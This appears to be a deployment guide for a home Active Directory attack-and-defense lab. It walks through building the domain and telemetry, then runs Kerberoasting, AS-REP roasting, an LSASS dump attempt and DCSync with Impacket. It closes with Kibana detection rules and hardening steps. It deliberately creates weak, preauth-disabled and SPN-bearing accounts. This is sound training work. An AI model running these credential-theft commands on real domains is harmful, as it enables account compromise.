# Deployment Guide — Active Directory Attack & Defense Lab

This document covers the full build process for the lab, from domain controller installation through the attack chain, detection engineering, and hardening. Steps reflect what was actually done in this lab — including troubleshooting steps that were required.

---

## Prerequisites

- VMware Workstation installed on the host machine
- Windows Server 2022 ISO (evaluation available from Microsoft)
- Windows 10 Pro ISO
- Kali Linux ISO (installer or VMware image from kali.org)
- Existing ELK-SIEM at 192.168.10.100 with Logstash running on port 5044
- All VMs on bridged networking: 192.168.10.0/24

---

## Phase 0 — Repository Setup

1. Create the GitHub repository folder:
   ```powershell
   mkdir C:\Users\jamed\CyberLab\GitHub\active-directory-attack-defense
   cd C:\Users\jamed\CyberLab\GitHub\active-directory-attack-defense
   git init
   ```

2. Create the folder structure:
   ```powershell
   mkdir configs, rules\kql, rules\sigma, evidence\screenshots, scripts\attack, scripts\detection, reports, kibana-exports
   ```

3. Create the screenshot folder:
   ```powershell
   mkdir C:\Users\jamed\CyberLab\Screenshots\lab2-active-directory-attack-defense
   ```

---

## Phase 1 — Domain Controller (WIN-DC01)

### 1.1 Create the VM

- OS: Windows Server 2022
- vCPU: 2 | RAM: 4 GB | Disk: 60 GB
- Network: Bridged (192.168.10.0/24)
- Hostname: WIN-DC01

**Troubleshooting:** If VMware prompts for a floppy disk, disable the floppy controller in VM Settings → Hardware.

### 1.2 Configure Network

Set a static IP before domain promotion — DHCP will conflict with DNS after promotion.

```powershell
# Run in PowerShell as Administrator on WIN-DC01
$adapter = Get-NetAdapter | Where-Object {$_.Status -eq "Up"}
New-NetIPAddress -InterfaceIndex $adapter.ifIndex -IPAddress 192.168.10.160 -PrefixLength 24 -DefaultGateway 192.168.10.1
Set-DnsClientServerAddress -InterfaceIndex $adapter.ifIndex -ServerAddresses 127.0.0.1
```

**Troubleshooting:** If 192.168.10.160 is already in use (ARP conflict), check existing DHCP leases on OPNsense and assign a static reservation or power off the conflicting device.

### 1.3 Install AD DS and DNS

```powershell
Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools
```

### 1.4 Promote to Domain Controller

```powershell
Import-Module ADDSDeployment
Install-ADDSForest `
  -DomainName "soc.local" `
  -DomainNetbiosName "SOC" `
  -InstallDns:$true `
  -SafeModeAdministratorPassword (ConvertTo-SecureString "YourDSRMPassword" -AsPlainText -Force) `
  -Force:$true
```

The server will restart. After reboot, log in as `SOC\Administrator`.

### 1.5 Create Users

```powershell
# Standard users
$users = @("d.reyes","m.santos","e.miller","l.kim","a.brooks","p.nair","m.lee","s.alvarez")
foreach ($u in $users) {
    New-ADUser -Name $u -SamAccountName $u -UserPrincipalName "$u@soc.local" `
               -AccountPassword (ConvertTo-SecureString "Summer2026!" -AsPlainText -Force) `
               -Enabled $true -PasswordNeverExpires $true
}

# Weak foothold accounts
New-ADUser -Name "h.temp" -SamAccountName "h.temp" -UserPrincipalName "h.temp@soc.local" `
           -AccountPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force) `
           -Enabled $true -PasswordNeverExpires $true

New-ADUser -Name "o.intern" -SamAccountName "o.intern" -UserPrincipalName "o.intern@soc.local" `
           -AccountPassword (ConvertTo-SecureString "Welcome1!" -AsPlainText -Force) `
           -Enabled $true -PasswordNeverExpires $true

# Admin accounts
New-ADUser -Name "r.hayes" -SamAccountName "r.hayes" -UserPrincipalName "r.hayes@soc.local" `
           -AccountPassword (ConvertTo-SecureString "[REDACTED]" -AsPlainText -Force) `
           -Enabled $true -PasswordNeverExpires $true
Add-ADGroupMember -Identity "Domain Admins" -Members "r.hayes"

New-ADUser -Name "o.grant" -SamAccountName "o.grant" -UserPrincipalName "o.grant@soc.local" `
           -AccountPassword (ConvertTo-SecureString "[REDACTED]" -AsPlainText -Force) `
           -Enabled $true -PasswordNeverExpires $true
Add-ADGroupMember -Identity "Domain Admins" -Members "o.grant"
```

### 1.6 Create Service Accounts (Intentionally Vulnerable)

```powershell
# Kerberoast target — register SPN to enable TGS requests
New-ADUser -Name "svc-sql-report" -SamAccountName "svc-sql-report" `
           -AccountPassword (ConvertTo-SecureString "[REDACTED]" -AsPlainText -Force) `
           -Enabled $true -PasswordNeverExpires $true
Set-ADUser -Identity "svc-sql-report" -ServicePrincipalNames @{Add="MSSQLSvc/win-dc01.soc.local:1433"}

# AS-REP Roast target — disable pre-authentication requirement
New-ADUser -Name "svc-backup-ops" -SamAccountName "svc-backup-ops" `
           -AccountPassword (ConvertTo-SecureString "[REDACTED]" -AsPlainText -Force) `
           -Enabled $true -PasswordNeverExpires $true
Set-ADAccountControl -Identity "svc-backup-ops" -DoesNotRequirePreAuth $true
```

### 1.7 Take VMware Snapshot

Name: `phase1-dc-configured`

---

## Phase 2 — AD Client (WIN10-ADCLIENT)

### 2.1 Create the VM

- OS: Windows 10 Pro
- vCPU: 2 | RAM: 4 GB | Disk: 60 GB
- Network: Bridged (192.168.10.0/24)
- Hostname: WIN10-ADCLIENT

### 2.2 Configure Network

```powershell
# DNS must point to the DC for domain join to succeed
$adapter = Get-NetAdapter | Where-Object {$_.Status -eq "Up"}
New-NetIPAddress -InterfaceIndex $adapter.ifIndex -IPAddress 192.168.10.161 -PrefixLength 24 -DefaultGateway 192.168.10.1
Set-DnsClientServerAddress -InterfaceIndex $adapter.ifIndex -ServerAddresses 192.168.10.160
```

**Troubleshooting:** If domain join fails with a DNS error, verify DNS is pointing to 192.168.10.160 (not 192.168.10.1). DHCP-assigned DNS to the gateway is the most common cause of domain join failure.

### 2.3 Join the Domain

```powershell
Add-Computer -DomainName "soc.local" -Credential (Get-Credential SOC\Administrator) -Restart
```

### 2.4 Install Sysmon

```powershell
# Download Sysmon from Sysinternals
# Download SwiftOnSecurity config
cd C:\Tools\Sysmon
.\Sysmon64.exe -accepteula -i sysmonconfig.xml
Get-Service Sysmon64
```

### 2.5 Install and Configure Winlogbeat

```powershell
# Extract Winlogbeat 8.19.13 to C:\Tools\Winlogbeat
# Edit winlogbeat.yml — use configs\winlogbeat-client.yml from this repo as reference
# Set execution policy if needed
Set-ExecutionPolicy RemoteSigned -Scope LocalMachine

cd C:\Tools\Winlogbeat\winlogbeat-8.19.13-windows-x86_64
.\install-service-winlogbeat.ps1
Start-Service winlogbeat
```

**Troubleshooting:** If the install script fails with an execution policy error, run `Set-ExecutionPolicy RemoteSigned` first.

### 2.6 Take VMware Snapshot

Name: `phase2-ad-client-domain-joined-telemetry-active`

---

## Phase 3 — Kali Attack Machine

### 3.1 Create the VM

- OS: Kali Linux (latest)
- vCPU: 2 | RAM: 4 GB
- Network: Bridged (192.168.10.0/24)
- Username: kali_hacker

### 3.2 Configure Network

```bash
# Set static IP via nmcli
nmcli con mod "Wired connection 1" ipv4.addresses 192.168.10.20/24
nmcli con mod "Wired connection 1" ipv4.gateway 192.168.10.1
nmcli con mod "Wired connection 1" ipv4.dns 192.168.10.160
nmcli con mod "Wired connection 1" ipv4.method manual
nmcli con up "Wired connection 1"
```

**Troubleshooting:** Kali may receive a DHCP address AND a manual static address simultaneously, creating a dual-IP state. Use `nmcli` to ensure only one connection profile is active.

### 3.3 Validate Tools

```bash
# BloodHound CE — start manually (not systemd-managed)
# Check Impacket
impacket-GetUserSPNs --help
impacket-GetNPUsers --help
impacket-secretsdump --help

# Check Hashcat
hashcat --version

# Verify connectivity
ping 192.168.10.160   # DC
ping 192.168.10.100   # ELK-SIEM
nslookup soc.local 192.168.10.160
```

### 3.4 Take VMware Snapshot

Name: `phase3-kali-tools-ready`

---

## Phase 4 — BloodHound Reconnaissance

### 4.1 Start BloodHound CE on Kali

```bash
# Start Neo4j (required for BloodHound CE)
sudo neo4j start
# Then launch BloodHound CE
bloodhound &
```

### 4.2 Run SharpHound on WIN10-ADCLIENT

```powershell
# Download SharpHound from: https://github.com/BloodHoundAD/SharpHound/releases
# Save to C:\Tools\SharpHound
# Add Defender exclusion for the folder
Add-MpPreference -ExclusionPath "C:\Tools\SharpHound"

# Run as domain user (r.hayes)
cd C:\Tools\SharpHound
.\SharpHound.exe -c All --domain soc.local --domaincontroller WIN-DC01.soc.local --outputdirectory C:\Tools\SharpHound
```

### 4.3 Transfer ZIP to Kali and Ingest

```bash
# On Kali — SCP from WIN10-ADCLIENT
scp WinUser@192.168.10.161:"C:/Tools/SharpHound/*.zip" /home/kali_hacker/

# Upload into BloodHound CE UI
# Import → select ZIP file
```

### 4.4 Take VMware Snapshot

Name: `phase4-bloodhound-recon-complete`

---

## Phase 5 — Kerberoasting

### 5.1 Request Kerberoast Hash

```bash
# From Kali — using h.temp foothold credentials
impacket-GetUserSPNs soc.local/h.temp:'Password123!' -dc-ip 192.168.10.160 -request -outputfile kerberoast_hashes.txt
cat kerberoast_hashes.txt
# REDACT hash before committing to GitHub
```

### 5.2 Install Winlogbeat on WIN-DC01 (Telemetry Gap Fix)

If Event 4769 is not appearing in ELK, Winlogbeat is not installed on the DC:
```powershell
# On WIN-DC01 — extract Winlogbeat and configure using configs\winlogbeat-dc.yml
# Install and start service
.\install-service-winlogbeat.ps1
Start-Service winlogbeat
```

Validate in Kibana Discover:
```kql
event.code: "4769" and winlog.event_data.TicketEncryptionType: "0x17"
```

### 5.3 Take VMware Snapshot

Name: `phase5-kerberoasting-detected`

---

## Phase 6 — AS-REP Roasting + LSASS

### 6.1 AS-REP Roasting

```bash
# From Kali
impacket-GetNPUsers soc.local/svc-backup-ops -dc-ip 192.168.10.160 -no-pass -format hashcat
# REDACT hash before committing
```

Validate in Kibana:
```kql
event.code: "4768" and winlog.event_data.PreAuthType: "0"
```

### 6.2 LSASS Dump Attempt (expect PPL block)

```powershell
# On WIN10-ADCLIENT — for detection validation only
# ProcDump will be blocked by Defender PPL
.\procdump.exe -ma lsass.exe lsass.dmp
```

Validate Sysmon Event 10 in Kibana:
```kql
event.code: "10" and winlog.event_data.TargetImage: "*lsass.exe"
```

### 6.3 Take VMware Snapshot

Name: `phase6-asrep-roasting-complete`

---

## Phase 7 — DCSync

### 7.1 Enable Directory Service Auditing (required for Event 4662)

```powershell
# On WIN-DC01
auditpol /set /subcategory:"Directory Service Access" /success:enable /failure:enable
auditpol /set /subcategory:"Directory Service Changes" /success:enable /failure:enable
```

### 7.2 Execute DCSync

```bash
# From Kali — requires account with replication rights
impacket-secretsdump soc.local/r.hayes:[REDACTED]@192.168.10.160 -just-dc
# REDACT all hashes before committing to GitHub
```

Validate Event 4662 in Kibana:
```kql
event.code: "4662" and winlog.event_data.Properties: "*1131f6ad*"
```

### 7.3 Take VMware Snapshot

Name: `phase8-dcsync-complete`

---

## Phase 9 — Detection Engineering

### 9.1 Create Detection Rules in Kibana Security

Navigate to: `Kibana → Security → Rules → Create new rule`

Create the following custom query rules (KQL queries are in `rules/kql/`):
1. Kerberoasting RC4 — Event 4769 etype 0x17
2. AS-REP Roasting — Event 4768 PreAuth 0
3. DCSync — Event 4662 replication GUIDs
4. SharpHound LDAP Burst — Event 4662 threshold
5. LSASS Process Access — Sysmon Event 10
6. Lateral Movement NTLM — Event 4624 LogonType 3

### 9.2 Export Rules as NDJSON

In Kibana Security:
1. Rules → select all 6 rules → Export
2. Save as `kibana-exports/ad-detection-rules.ndjson`

---

## Phase 10 — AD Hardening

### 10.1 Protected Users Group

```powershell
# On WIN-DC01
Add-ADGroupMember -Identity "Protected Users" -Members "r.hayes","Administrator"
# Validate
Get-ADGroupMember -Identity "Protected Users" | Select-Object Name
```

### 10.2 Enforce AES-Only Kerberos

```powershell
Set-ADUser -Identity "svc-sql-report" -KerberosEncryptionType AES128,AES256
# Validate
Get-ADUser -Identity "svc-sql-report" -Properties msDS-SupportedEncryptionTypes | Select-Object msDS-SupportedEncryptionTypes
```

### 10.3 Re-enable Kerberos PreAuth

```powershell
Set-ADAccountControl -Identity "svc-backup-ops" -DoesNotRequirePreAuth $false
# Validate
Get-ADUser -Identity "svc-backup-ops" -Properties DoesNotRequirePreAuth | Select-Object DoesNotRequirePreAuth
```

### 10.4 Strengthen Password Policy

```powershell
Set-ADDefaultDomainPasswordPolicy -Identity soc.local `
  -MinPasswordLength 16 `
  -ComplexityEnabled $true `
  -LockoutThreshold 5 `
  -LockoutDuration (New-TimeSpan -Minutes 30) `
  -LockoutObservationWindow (New-TimeSpan -Minutes 30)
# Validate
Get-ADDefaultDomainPasswordPolicy
```

### 10.5 Enable Directory Service Auditing

```powershell
auditpol /set /subcategory:"Directory Service Access" /success:enable /failure:enable
auditpol /set /subcategory:"Directory Service Changes" /success:enable /failure:enable
# Validate
auditpol /get /subcategory:"Directory Service Access"
auditpol /get /subcategory:"Directory Service Changes"
```

### 10.6 Post-Hardening BloodHound Collection

```powershell
# On WIN10-ADCLIENT
.\SharpHound.exe -c All --domain soc.local --domaincontroller WIN-DC01.soc.local --outputdirectory C:\Tools\SharpHound
# Transfer to Kali and ingest into BloodHound CE
# Compare attack paths before/after — capture screenshots
```

### 10.7 Take VMware Snapshot

Name: `phase10-ad-hardening-complete`

---

## Validation Commands

### Check Winlogbeat status (Windows)

```powershell
Get-Service winlogbeat
# Test config
.\winlogbeat.exe test config -c winlogbeat.yml -e
```

### Check Sysmon status

```powershell
Get-Service Sysmon64
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 5
```

### Verify events in Kibana

```kql
# All events from DC
host.name: "WIN-DC01"

# All events from client
host.name: "WIN10-ADCLIENT"

# Last hour of events
@timestamp > now-1h
```
